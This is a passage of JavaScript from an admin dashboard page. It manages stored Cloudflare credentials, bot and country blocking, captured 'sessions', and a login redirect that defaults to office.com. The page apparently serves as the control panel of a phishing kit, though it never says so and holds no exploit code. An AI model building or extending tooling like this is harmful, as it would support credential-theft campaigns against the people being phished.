            const zoneId = document.getElementById('cf-zone-id').value.trim();
            const saveBtn = document.getElementById('save-config-btn');

            if (!email || !apiKey || !zoneId) {
                alert('⚠️ EMAIL, API KEY, AND ZONE ID ARE ALL REQUIRED');
                return;
            }

            saveBtn.disabled = true;
            saveBtn.textContent = 'SYNCING...';

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/configure?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        email: email,
                        apiKey: apiKey, 
                        zoneId: zoneId 
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('cf-config-status').innerHTML = 
                        '<span class="status-badge status-success">✅ Cloudflare Configured Successfully</span>';

                    // Clear the input fields for security
                    document.getElementById('cf-email').value = '';
                    document.getElementById('cf-api-key').value = '';
                    document.getElementById('cf-zone-id').value = '';

                    // Load Cloudflare status immediately
                    setTimeout(() => loadCloudflareStatus(), 1000);

                    alert('✅ CLOUDFLARE CONFIGURATION SAVED SUCCESSFULLY!\n\nCredentials have been securely stored and the system is now connected to your Cloudflare account.');
                } else {
                    throw new Error(data.error || 'Configuration failed');
                }
            } catch (error) {
                console.error('Error saving Cloudflare config:', error);
                document.getElementById('cf-config-status').innerHTML = 
                    `<span class="status-badge status-error">❌ Configuration Failed: ${error.message}</span>`;
                alert('❌ CONFIGURATION FAILED: ' + error.message);
            } finally {
                saveBtn.disabled = false;
                saveBtn.textContent = 'SAVE';
            }
        }

        function loadConfigurationStatus() {
            // Check if Cloudflare is already configured by trying to load status
            if (isAuthenticated) {
                loadCloudflareStatus().then(() => {
                    // If status loads successfully, update config status
                    const cfStatus = document.getElementById('cf-status').textContent;
                    if (cfStatus === 'ONLINE') {
                        document.getElementById('cf-config-status').innerHTML = 
                            '<span style="color: #00ff66; font-weight: bold;">✅ CLOUDFLARE CONFIGURED & CONNECTED</span>';
                    }
                }).catch(() => {
                    // Keep the default "not configured" message
                });
            }
        }

        // Cloudflare Management Functions
        async function loadCloudflareStatus() {
            if (!isAuthenticated) {
                document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/status?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    logout();
                    return;
                }

                const data = await response.json();

                if (data.success) {
                    document.getElementById('cf-status').textContent = 'ONLINE';
                    document.getElementById('cf-status').style.color = '#00ff66';

                    // Update status displays
                    updateCloudflareStatus(data.settings);
                    
                    // Also load country rules when loading status
                    await loadCountryRules();
                } else {
                    document.getElementById('cf-status').textContent = 'ERROR';
                    document.getElementById('cf-status').style.color = '#ff3333';
                }
            } catch (error) {
                console.error('Error loading Cloudflare status:', error);
                document.getElementById('cf-status').textContent = 'OFFLINE';
                document.getElementById('cf-status').style.color = '#ff3333';
            }
        }

        function updateCloudflareStatus(settings) {
            // Update Bot Fight Mode
            const botFightStatus = document.getElementById('bot-fight-status');
            if (botFightStatus) {
                botFightStatus.textContent = settings.botFightMode ? 'ON' : 'OFF';
                botFightStatus.style.color = settings.botFightMode ? '#00ff66' : '#ff6666';
            }

            // Update Security Level
            const securityLevelStatus = document.getElementById('security-level-status');
            const securityLevelSelect = document.getElementById('security-level-select');

            if (securityLevelStatus) {
                securityLevelStatus.textContent = settings.securityLevel.toUpperCase();
                const securityColors = {
                    'off': '#666',
                    'essentially_off': '#999',
                    'low': '#ffff66',
                    'medium': '#ff9933',
                    'high': '#ff6666',
                    'under_attack': '#ff0000'
                };
                securityLevelStatus.style.color = securityColors[settings.securityLevel] || '#ff6666';
            }

            if (securityLevelSelect) {
                securityLevelSelect.value = settings.securityLevel;
            }

            // Update Browser Check
            const browserCheckStatus = document.getElementById('browser-check-status');
            if (browserCheckStatus) {
                browserCheckStatus.textContent = settings.browserCheck ? 'ON' : 'OFF';
                browserCheckStatus.style.color = settings.browserCheck ? '#00ff66' : '#ff6666';
            }
        }

        async function toggleBotFight() {
            if (!isAuthenticated) return;

            const btn = document.getElementById('bot-fight-btn');
            btn.disabled = true;
            btn.textContent = 'PROCESSING...';

            try {
                const currentStatus = document.getElementById('bot-fight-status').textContent === 'ON';
                const token = getStoredToken();

                const response = await fetch(`/api/admin/cloudflare/bot-fight?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: !currentStatus })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('bot-fight-status').textContent = data.enabled ? 'ON' : 'OFF';
                    document.getElementById('bot-fight-status').style.color = data.enabled ? '#00ff66' : '#ff6666';
                    console.log(data.message);
                } else {
                    alert('Error: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error toggling bot fight:', error);
                alert('Network error occurred');
            } finally {
                btn.disabled = false;
                btn.textContent = 'TOGGLE BOT FIGHT';
            }
        }

        async function setSecurityLevel() {
            if (!isAuthenticated) return;

            const level = document.getElementById('security-level-select').value;
            const token = getStoredToken();

            try {
                const response = await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ level })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('security-level-status').textContent = data.level.toUpperCase();
                    const securityColors = {
                        'off': '#666',
                        'essentially_off': '#999',
                        'low': '#ffff66',
                        'medium': '#ff9933',
                        'high': '#ff6666',
                        'under_attack': '#ff0000'
                    };
                    document.getElementById('security-level-status').style.color = securityColors[data.level] || '#ff6666';
                    console.log(data.message);
                } else {
                    console.error('Security level error:', data.error);
                    alert('Error: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error setting security level:', error);
                alert('Network error occurred');
            }
        }

        async function toggleBrowserCheck() {
            if (!isAuthenticated) return;

            const btn = document.getElementById('browser-check-btn');
            btn.disabled = true;
            btn.textContent = 'PROCESSING...';

            try {
                const currentStatus = document.getElementById('browser-check-status').textContent === 'ON';
                const token = getStoredToken();

                const response = await fetch(`/api/admin/cloudflare/browser-check?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: !currentStatus })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('browser-check-status').textContent = data.enabled ? 'ON' : 'OFF';
                    document.getElementById('browser-check-status').style.color = data.enabled ? '#00ff66' : '#ff6666';
                    console.log(data.message);
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                console.error('Error toggling browser check:', error);
                alert('Network error occurred');
            } finally {
                btn.disabled = false;
                btn.textContent = 'TOGGLE BROWSER CHECK';
            }
        }

        // Country Access Control Functions
        async function loadCountryRules() {
            if (!isAuthenticated) return;

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/country-rules?token=${encodeURIComponent(token)}`);
                const data = await response.json();

                if (data.success) {
                    displayCountryRules(data.rules);
                    document.getElementById('country-rules-count').textContent = data.count;
                    
                    // Update access status based on rules
                    if (data.count === 0) {
                        document.getElementById('country-access-status').textContent = 'OPEN';
                        document.getElementById('country-access-status').style.color = '#0099ff';
                    } else {
                        document.getElementById('country-access-status').textContent = 'RESTRICTED';
                        document.getElementById('country-access-status').style.color = '#ff6666';
                    }
                } else {
                    console.error('Failed to load country rules:', data.error);
                    document.getElementById('country-rules-container').innerHTML = `
                        <div style="color: #ff6666; font-size: 10px; text-align: center; padding: 15px;">
                            Failed to load country rules: ${data.error}
                        </div>
                    `;
                }
            } catch (error) {
                console.error('Error loading country rules:', error);
                document.getElementById('country-rules-container').innerHTML = `
                    <div style="color: #ff6666; font-size: 10px; text-align: center; padding: 15px;">
                        Network error loading country rules
                    </div>
                `;
            }
        }

        function displayCountryRules(rules) {
            const container = document.getElementById('country-rules-container');
            
            if (!rules || rules.length === 0) {
                container.innerHTML = `
                    <div style="color: #666; font-size: 10px; text-align: center; padding: 15px;">
                        No country access rules configured
                    </div>
                `;
                return;
            }

            const rulesHtml = rules.map(rule => {
                const isBlockRule = rule.expression.includes(' in ');
                const actionText = isBlockRule ? 'BLOCK' : 'ALLOW ONLY';
                const actionColor = isBlockRule ? '#ff6666' : '#00ff66';
                
                // Extract countries from expression
                const matches = rule.expression.match(/\{"([^"]+)"/);
                const countries = matches ? matches[1].split('" "') : [];
                
                return `
                    <div style="background: rgba(0,0,0,0.3); border: 1px solid #444; padding: 8px; border-radius: 3px; margin-bottom: 8px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
                            <div style="color: ${actionColor}; font-size: 10px; font-weight: bold;">${actionText}</div>
                            <button onclick="deleteCountryRule('${rule.id}')" style="background: #cc3333; color: white; border: none; padding: 2px 6px; font-size: 8px; border-radius: 2px; cursor: pointer;">
                                DELETE
                            </button>
                        </div>
                        <div style="color: #ff9933; font-size: 9px; margin-bottom: 2px;">
                            Countries: ${countries.join(', ')}
                        </div>
                        <div style="color: #666; font-size: 8px;">
                            ${rule.description || 'No description'}
                        </div>
                    </div>
                `;
            }).join('');

            container.innerHTML = rulesHtml;
        }

        async function createCountryRule() {
            if (!isAuthenticated) return;

            const action = document.getElementById('country-action-select').value;
            const countriesInput = document.getElementById('country-codes-input').value.trim();
            const ruleName = document.getElementById('country-rule-name').value.trim();
            const btn = document.getElementById('create-country-rule-btn');

            if (!countriesInput) {
                alert('Please enter country codes (e.g., CN,RU,KP)');
                return;
            }

            // Parse and validate country codes
            const countries = countriesInput.split(',').map(c => c.trim().toUpperCase()).filter(c => c.length === 2);
            
            if (countries.length === 0) {
                alert('Please enter valid 2-letter country codes separated by commas');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'CREATING...';

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/country-rules?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        action: action,
                        countries: countries,
                        ruleName: ruleName || undefined
                    })
                });

                const data = await response.json();

                if (data.success) {
                    // Clear form
                    document.getElementById('country-codes-input').value = '';
                    document.getElementById('country-rule-name').value = '';
                    
                    // Reload rules
                    await loadCountryRules();
                    
                    console.log(data.message);
                    alert(`✅ Country rule created successfully!\n\n${data.message}`);
                } else {
                    alert('Error creating country rule: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error creating country rule:', error);
                alert('Network error occurred while creating rule');
            } finally {
                btn.disabled = false;
                btn.textContent = 'CREATE RULE';
            }
        }

        async function deleteCountryRule(ruleId) {
            if (!isAuthenticated) return;
            
            if (!confirm('Are you sure you want to delete this country access rule?')) {
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/country-rules/${ruleId}?token=${encodeURIComponent(token)}`, {
                    method: 'DELETE'
                });

                const data = await response.json();

                if (data.success) {
                    // Reload rules
                    await loadCountryRules();
                    console.log(data.message);
                } else {
                    alert('Error deleting country rule: ' + (data.message || data.error || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error deleting country rule:', error);
                alert('Network error occurred while deleting rule');
            }
        }

        async function enableUnderAttack() {
            if (!confirm('⚠️ This will enable UNDER ATTACK MODE - very strict security. Continue?')) return;

            const token = getStoredToken();

            try {
                const response = await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ level: 'under_attack' })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('security-level-status').textContent = 'UNDER ATTACK';
                    document.getElementById('security-level-status').style.color = '#ff0000';
                    document.getElementById('security-level-select').value = 'under_attack';
                    alert('🚨 UNDER ATTACK MODE ENABLED');
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (error) {
                console.error('Error enabling under attack mode:', error);
                alert('Network error occurred');
            }
        }

        async function disableAllProtection() {
            if (!confirm('⚠️ This will DISABLE ALL PROTECTION. Are you sure?')) return;

            const token = getStoredToken();

            try {
                // Disable bot fight mode
                await fetch(`/api/admin/cloudflare/bot-fight?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: false })
                });

                // Set security to off
                await fetch(`/api/admin/cloudflare/security-level?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ level: 'off' })
                });

                // Disable browser check
                await fetch(`/api/admin/cloudflare/browser-check?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ enabled: false })
                });

                // Refresh status
                setTimeout(() => loadCloudflareStatus(), 1000);
                alert('🔓 ALL PROTECTION DISABLED');
            } catch (error) {
                console.error('Error disabling protection:', error);
                alert('Network error occurred');
            }
        }

        // Load authentication state when page loads
        document.addEventListener('DOMContentLoaded', function() {
            checkAuthOnLoad();
            // Load analytics and redirect config on page load regardless of auth status
            setTimeout(() => {
                loadAnalytics();
                loadRedirectConfig();
            }, 500);
        });

        // Update the updateAuthUI function to include configuration status
        const originalUpdateAuthUI = updateAuthUI;
        updateAuthUI = function(authenticated) {
            originalUpdateAuthUI(authenticated);
            if (authenticated) {
                setTimeout(() => loadConfigurationStatus(), 1000);
            }
        };

        // Enhanced refresh to include Cloudflare status
        setInterval(() => {
            if (isAuthenticated) {
                loadSessions();
                loadAnalytics();
                loadCloudflareStatus();
            }
        }, 30000);

        // Redirect Configuration Functions
        async function loadRedirectConfig() {
            try {
                console.log('Loading redirect configuration...');
                const response = await fetch(`/api/internal/redirect-url`);
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
                const data = await response.json();
                console.log('Redirect config response:', data);

                if (data.success && data.redirectUrl) {
                    const currentUrl = data.redirectUrl;
                    document.getElementById('current-redirect-display').textContent = `🎯 ${currentUrl}`;

                    // Update status
                    document.getElementById('redirect-status').innerHTML = 
                        `<span style="color: #00ff88; font-weight: bold;">📍 REDIRECT STATUS: ACTIVE → ${currentUrl}</span>`;

                    // Set dropdown value
                    const select = document.getElementById('redirect-destination');
                    const option = Array.from(select.options).find(opt => opt.value === currentUrl);
                    if (option) {
                        select.value = currentUrl;
                        document.getElementById('custom-redirect-url').style.display = 'none';
                    } else {
                        select.value = 'custom';
                        document.getElementById('custom-redirect-url').value = currentUrl;
                        document.getElementById('custom-redirect-url').style.display = 'block';
                    }

                    console.log('✅ Redirect config loaded successfully:', currentUrl);
                } else {
                    throw new Error(data.error || 'Failed to load redirect configuration');
                }
            } catch (error) {
                console.error('Error loading redirect config:', error);
                document.getElementById('current-redirect-display').textContent = '❌ Failed to load';
                document.getElementById('redirect-status').innerHTML = 
                    `<span style="color: #ff3333; font-weight: bold;">❌ ERROR: ${error.message || 'Network Error'}</span>`;

                // Set default values
                const select = document.getElementById('redirect-destination');
                if (select) {
                    select.value = 'https://office.com';
                }
                const customInput = document.getElementById('custom-redirect-url');
                if (customInput) {
                    customInput.style.display = 'none';
                }
            }
        }

        async function updateProjectRedirect() {
            if (!isAuthenticated) {
                alert('⚠️ AUTHENTICATION REQUIRED TO UPDATE REDIRECT');
                return;
            }

            const token = getStoredToken();
            if (!token) {
                alert('⚠️ AUTHENTICATION TOKEN MISSING');
                logout();
                return;
            }

            const select = document.getElementById('redirect-destination');
            const customInput = document.getElementById('custom-redirect-url');

            let targetUrl = select.value;
            if (targetUrl === 'custom') {
                targetUrl = customInput.value.trim();
                if (!targetUrl) {
                    alert('Please enter a custom URL');
                    return;
                }
                // Basic URL validation
                try {
                    new URL(targetUrl);
                } catch (e) {
                    alert('Please enter a valid URL (including https://)');
                    return;
                }
            }

            // Disable button during update
            const updateBtn = event.target;
            const originalText = updateBtn.textContent;
            updateBtn.disabled = true;
            updateBtn.textContent = 'UPDATING...';

            try {
                const response = await fetch(`/api/admin/project-redirect?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ redirectUrl: targetUrl })
                });

                if (response.status === 401) {
                    logout();
                    alert('SESSION EXPIRED: RE-AUTHENTICATION REQUIRED');
                    return;
                }

                const data = await response.json();

                if (data.success) {
                    document.getElementById('current-redirect-display').textContent = `🎯 ${targetUrl}`;
                    document.getElementById('redirect-status').innerHTML = 
                        `<span style="color: #00ff88; font-weight: bold;">✅ PROJECT REDIRECT UPDATED: ${targetUrl}</span>`;
                    alert(`✅ Project redirect destination updated to: ${targetUrl}\nThis affects all login redirects in your project.`);
                } else {
                    alert('Error: ' + (data.error || 'Update failed'));
                    document.getElementById('redirect-status').innerHTML = 
                        `<span style="color: #ff3333; font-weight: bold;">❌ UPDATE FAILED: ${data.error || 'Unknown error'}</span>`;
                }
            } catch (error) {
                console.error('Error updating redirect config:', error);
                alert('Network error occurred: ' + error.message);
                document.getElementById('redirect-status').innerHTML = 
                    `<span style="color: #ff3333; font-weight: bold;">❌ NETWORK ERROR</span>`;
            } finally {
                updateBtn.disabled = false;
                updateBtn.textContent = originalText;
            }
        }

        // Dropdown toggle functionality
        function toggleSection(sectionName) {
            const content = document.getElementById(sectionName + '-content');
            const arrow = document.getElementById(sectionName + '-arrow');
            
            if (content.classList.contains('expanded')) {
                content.classList.remove('expanded');
                arrow.textContent = '▶';
            } else {
                content.classList.add('expanded');
                arrow.textContent = '▼';
            }
        }

        // Handle custom URL dropdown
        document.addEventListener('DOMContentLoaded', function() {
            const select = document.getElementById('redirect-destination');
            const customInput = document.getElementById('custom-redirect-url');

            if (select && customInput) {
                select.addEventListener('change', function() {
                    if (this.value === 'custom') {
                        customInput.style.display = 'block';
                        customInput.focus();
                    } else {
                        customInput.style.display = 'none';
                    }
                });
            }
        });

        // Load Cloudflare status when authenticated
        function updateAuthUI(authenticated) {
            isAuthenticated = authenticated;
            const authSection = document.getElementById('auth-section');
            const authForm = document.getElementById('auth-form');
            const authSuccess = document.getElementById('auth-success');
            const loading = document.getElementById('loading');
            const sessionsContent = document.getElementById('sessions-content');
            const noSessions = document.getElementById('no-sessions');

            if (authenticated) {
                authSection.classList.add('authenticated');
                authForm.style.display = 'none';
                authSuccess.style.display = 'block';
                loading.style.display = 'block';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
                // Load Cloudflare status and redirect config
                setTimeout(() => {
                    loadCloudflareStatus().then(() => {
                        // If Cloudflare status loads successfully, update config status
                        const cfStatus = document.getElementById('cf-status').textContent;
                        if (cfStatus === 'ONLINE') {
                            document.getElementById('cf-config-status').innerHTML = 
                                '<span style="color: #00ff66; font-weight: bold;">✅ CLOUDFLARE CONFIGURED & CONNECTED</span>';
                            // Hide the configuration form fields when already configured
                            const configInputs = document.querySelector('#cloudflare-config-section > div:first-of-type');
                            if (configInputs) {
                                configInputs.style.display = 'none';
                            }
                        } else {
                            // Show configuration form if not connected
                            const configInputs = document.querySelector('#cloudflare-config-section > div:first-of-type');
                            if (configInputs) {
                                configInputs.style.display = 'flex';
                            }
                        }
                    }).catch(() => {
                        // Keep showing not configured if status fails to load
                        document.getElementById('cf-config-status').innerHTML = 
                            '<span style="color: #ff6666; font-weight: bold;">⚠️ NOT CONFIGURED</span>';
                        // Show configuration form when there's an error
                        const configInputs = document.querySelector('#cloudflare-config-section > div:first-of-type');
                        if (configInputs) {
                            configInputs.style.display = 'flex';
                        }
                    });
                    loadRedirectConfig();
                }, 500);
            } else {
                authSection.classList.remove('authenticated');
                authForm.style.display = 'block';
                authSuccess.style.display = 'none';
                loading.style.display = 'none';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
                document.getElementById('error').style.display = 'none';
                // Reset Cloudflare status and redirect display
                document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
                document.getElementById('cf-status').style.color = '#ff6666';
                document.getElementById('current-redirect-display').textContent = 'Authentication Required';
                // Reset configuration status when logged out
                document.getElementById('cf-config-status').innerHTML = 
                    '<span style="color: #ff6666; font-weight: 500;">⚠️ NOT CONFIGURED</span>';
                // Show configuration form when logged out
                const configInputs = document.querySelector('#cloudflare-config-section > div:first-of-type');
                if (configInputs) {
                    configInputs.style.display = 'flex';
                }
            }
        }
    </script>
</body>
</html>